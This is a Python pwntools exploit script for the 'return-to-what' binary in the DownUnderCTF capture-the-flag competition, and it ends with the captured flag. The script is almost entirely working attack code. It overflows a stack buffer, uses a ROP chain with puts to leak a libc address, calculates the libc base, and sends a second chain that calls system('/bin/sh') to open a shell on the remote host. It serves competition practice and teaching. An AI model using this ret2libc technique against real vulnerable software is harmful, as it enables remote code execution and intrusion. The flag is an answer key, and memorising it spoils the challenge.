from pwn import *  # working with pwntools

context.arch = "amd64"  # found the architecture
offset = 56  # found it manually

elf = ELF("./return-to-what")  # load the elf file
proc = remote("chal.duc.tf", 30003)  # connect to the remote service

# memory leak
# using the gadget puts to get the memory address of the puts function
# and searching the address in the libc database() to find the address of other function
rop = ROP(elf)
rop.call(elf.symbols["puts"], [elf.got["puts"]])

# once again calling the function to interact
rop.call(elf.symbols["vuln"])

proc.recv()

# creating and sending the payload
payload = b"A" * offset + rop.chain()
proc.sendline(payload)

puts = u64(proc.recvuntil("\n").rstrip().ljust(8, b"\x00"))

# using the value we get the global offsets for the libc library that the victim machine is using
log.info(f"puts found at {hex(puts)}")

# loading the libc database
libc = ELF("libc6_2.27-3ubuntu1_amd64.so")
libc.address = puts - libc.symbols["puts"] #calculating base address???
log.info(f"base address determined {hex(libc.address)}")

rop = ROP(libc)
rop.call(libc.symbols["puts"], [next(libc.search(b"/bin/sh"))])
rop.call(libc.symbols["system"], [next(libc.search(b"/bin/sh"))])
rop.call(libc.symbols["exit"])

# creating and sending the payload
payload = b"A" * offset + rop.chain()
proc.sendline(payload)

proc.interactive()

#DUCTF{ret_pUts_ret_main_ret_where???}